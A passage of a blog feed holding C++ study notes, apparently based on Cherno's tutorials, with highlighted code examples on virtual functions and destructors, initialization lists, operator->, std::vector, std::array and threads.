class="function"><span class="keyword">virtual</span> std::string <span class="title">GetName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Entity&quot;</span>; &#125;<span class="comment">//virtual</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> : <span class="keyword">public</span> Entity</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">std::string m_Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Player</span>(<span class="type">const</span> std::string&amp; name)</span><br><span class="line">: <span class="built_in">m_Name</span>(name)&#123;&#125;<span class="comment">//constructor initialize list</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">GetName</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> m_Name; &#125;<span class="comment">//override</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintName</span><span class="params">(Entity* entity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; entity-&gt;<span class="built_in">GetName</span>() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Entity* e = <span class="keyword">new</span> <span class="built_in">Entity</span>();</span><br><span class="line">Player* p = <span class="keyword">new</span> <span class="built_in">Player</span>(<span class="string">&quot;Randolfluo&quot;</span>);</span><br><span class="line"><span class="built_in">PrintName</span>(e);</span><br><span class="line"><span class="built_in">PrintName</span>(p);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="virtual-destruction"><a href="#virtual-destruction" class="headerlink" title="virtual destruction"></a>virtual destruction</h3><ul><li>When the parent class pointer points to the child class, the correct fictitious function is called to prevent memory leaks</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> print(x) std::cout&lt;&lt; x  &lt;&lt; std::endl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father1</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Father1</span>() &#123; <span class="built_in">print</span>(<span class="string">&quot;Father1 Construction&quot;</span>); &#125;</span><br><span class="line">~<span class="built_in">Father1</span>() &#123; <span class="built_in">print</span>(<span class="string">&quot;Father1 Destruction&quot;</span>); &#125;<span class="comment">//Causing a memory leak</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father2</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Father2</span>() &#123; <span class="built_in">print</span>(<span class="string">&quot;Father2 Construction&quot;</span>); &#125;</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">Father2</span>() &#123; <span class="built_in">print</span>(<span class="string">&quot;Father2 Destruction&quot;</span>); &#125;<span class="comment">//virtual destruction</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span> :<span class="keyword">public</span> Father1</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span>* m_arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Son1</span>() &#123; m_arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];<span class="built_in">print</span>(<span class="string">&quot;Son1 Construction&quot;</span>); &#125;</span><br><span class="line">~<span class="built_in">Son1</span>() &#123; <span class="keyword">delete</span>[] m_arr; <span class="built_in">print</span>(<span class="string">&quot;Son1 Destruction&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span> :<span class="keyword">public</span> Father2</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span>* m_arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Son2</span>() &#123; m_arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>]; <span class="built_in">print</span>(<span class="string">&quot;Son2 Construction&quot;</span>); &#125;</span><br><span class="line">~<span class="built_in">Son2</span>() &#123; <span class="keyword">delete</span>[] m_arr; <span class="built_in">print</span>(<span class="string">&quot;Son2 Destruction&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Father1* f1 = <span class="keyword">new</span> <span class="built_in">Son1</span>();</span><br><span class="line"><span class="keyword">delete</span> f1;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---------------------------------------------------------------&quot;</span>);</span><br><span class="line">Father2* f2 = <span class="keyword">new</span> <span class="built_in">Son2</span>();</span><br><span class="line"><span class="keyword">delete</span> f2;</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Father1 Construction</span></span><br><span class="line"><span class="comment">//Son1 Construction</span></span><br><span class="line"><span class="comment">//Father1 Destruction</span></span><br><span class="line"><span class="comment">//---------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//Father2 Construction</span></span><br><span class="line"><span class="comment">//Son2 Construction</span></span><br><span class="line"><span class="comment">//Son2 Destruction</span></span><br><span class="line"><span class="comment">//Father2 Destruction</span></span><br></pre></td></tr></table></figure><p>//TODO</p><h3 id="Initialization-List"><a href="#Initialization-List" class="headerlink" title="Initialization List"></a>Initialization List</h3><ul><li>Initializers help you get initialization done quickly</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Entity2</span>()</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;call Entity()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Entity2</span>(<span class="type">int</span> x)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;call Entity2() with arg &quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">std::string m_Name;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">Entity2 entity22;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">Entity</span>()</span><br><span class="line">: <span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>), <span class="built_in">x</span>(<span class="number">114514</span>), <span class="built_in">entity22</span>(<span class="number">2</span>)<span class="comment">//Initialization List</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Entity</span>(<span class="type">const</span> std::string&amp; name)</span><br><span class="line">:<span class="built_in">m_Name</span>(name),<span class="built_in">x</span>(<span class="number">123</span>)<span class="comment">//Initialization List</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">const</span> std::string&amp; <span class="title">GetName</span><span class="params">()</span><span class="type">const</span> </span>&#123; <span class="keyword">return</span> m_Name; &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Entity e;</span><br><span class="line"><span class="function">Entity <span class="title">e1</span><span class="params">(<span class="string">&quot;Randolfluo&quot;</span>)</span></span>;</span><br><span class="line">std::cout &lt;&lt; e.<span class="built_in">GetName</span>() &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; e.<span class="built_in">GetName</span>() &lt;&lt; std::endl;</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> output:</span><br><span class="line"><span class="comment">//call Entity2() with arg 2</span></span><br><span class="line"><span class="comment">//call Entity()</span></span><br><span class="line"><span class="comment">//Unknown</span></span><br><span class="line"><span class="comment">//Unknown</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector3</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">double</span> x, y, z;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> offset = (<span class="type">int</span>)&amp;((Vector3*)<span class="number">0</span>)-&gt;z;<span class="comment">//0+16</span></span><br><span class="line">std::cout &lt;&lt; offset &lt;&lt; std::endl;<span class="comment">//16</span></span><br><span class="line"> offset = (<span class="type">int</span>)&amp;((Vector3*)<span class="number">1000</span>)-&gt;z;<span class="comment">//1000+16</span></span><br><span class="line">std::cout &lt;&lt; offset &lt;&lt; std::endl;<span class="comment">//1016</span></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> <span class="type">const</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScopedPtr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Entity* m_obj;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">ScopedPtr</span>(Entity* entity)</span><br><span class="line">:<span class="built_in">m_obj</span>(entity)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">ScopedPtr</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_obj;</span><br><span class="line">&#125;</span><br><span class="line">Entity* <span class="keyword">operator</span>-&gt;()<span class="comment">//overload -&gt;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> Entity* <span class="keyword">operator</span>-&gt;() <span class="type">const</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">ScopedPtr e = <span class="keyword">new</span> Entity;</span><br><span class="line">e-&gt;<span class="built_in">Print</span>();<span class="comment">//different class</span></span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> cherno </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> cherno </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cpp_Standard_Templete_Library</title>
      <link href="/2024/03/18/C&amp;C++/CppStandardTempleteLibrary/"/>
      <url>/2024/03/18/C&amp;C++/CppStandardTempleteLibrary/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="vcector"><a href="#vcector" class="headerlink" title="vcector"></a>vcector</h3><ul><li>Store in the heap.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vertex</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">float</span> x, y, z;</span><br><span class="line"><span class="built_in">Vertex</span>(<span class="type">float</span> x, <span class="type">float</span> y, <span class="type">float</span> z)</span><br><span class="line">:<span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">z</span>(z)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Vertex</span>(<span class="type">const</span> Vertex&amp; vertex)</span><br><span class="line">:<span class="built_in">x</span>(vertex.x), <span class="built_in">y</span>(vertex.y), <span class="built_in">z</span>(vertex.z)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Copied!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> Vertex&amp; vertices)</span><br><span class="line">&#123;</span><br><span class="line">stream &lt;&lt; vertices.x &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; vertices.y &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; vertices.z;</span><br><span class="line"><span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;);</span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;);</span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vertices.<span class="built_in">size</span>(); i++)</span><br><span class="line">std::cout &lt;&lt; vertices[i] &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (Vertex&amp; v : vertices)</span><br><span class="line">std::cout &lt;&lt; v &lt;&lt; std::endl;</span><br><span class="line">vertices.<span class="built_in">erase</span>(vertices.<span class="built_in">begin</span>() + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (Vertex&amp; v : vertices)</span><br><span class="line">std::cout &lt;&lt; v &lt;&lt; std::endl;</span><br><span class="line">vertices.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output</span></span><br></pre></td></tr></table></figure><p>vector strategy</p><p>1+2+3</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">    vertices.<span class="built_in">reserve</span>(<span class="number">3</span>);<span class="comment">//set the size of vector</span></span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;);</span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;);</span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> &#125;);</span><br><span class="line">   <span class="comment">// The constructor is called in the main function and then passed to the vector</span></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//Copied!</span></span><br><span class="line"><span class="comment">//Copied!</span></span><br><span class="line"><span class="comment">//Copied!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">    vertices.<span class="built_in">reserve</span>(<span class="number">3</span>);<span class="comment">//set the size of vector</span></span><br><span class="line">vertices.<span class="built_in">emplace_back</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> );</span><br><span class="line">vertices.<span class="built_in">emplace_back</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> );</span><br><span class="line">vertices.<span class="built_in">emplace_back</span>(<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> );<span class="comment">//Pass constructor arguments directly</span></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>//TODO</p><h3 id="std-array"><a href="#std-array" class="headerlink" title="std::array"></a>std::array</h3><ul><li>store in the stack.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="type">int</span> N&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintArray</span><span class="params">(<span class="type">const</span> std::array&lt;T, N&gt;&amp; data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">std::cout &lt;&lt; data[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">std::array&lt;<span class="type">int</span>, 6&gt; <span class="title">Array</span><span class="params">(&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;)</span></span>;</span><br><span class="line"><span class="built_in">PrintArray</span>(Array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> is_Finished = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std::literals::chrono_literals;<span class="comment">//define ms,s</span></span><br><span class="line"><span class="keyword">while</span> (!is_Finished)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;working&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::this_thread::<span class="built_in">sleep_for</span>(<span class="number">1</span>s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">std::thread <span class="title">worker</span><span class="params">(Work)</span></span>;</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">is_Finished = <span class="literal">true</span>;</span><br><span class="line">worker.<span class="built_in">join</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><ul><li>win32api    QueryPerformanceCounter</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title 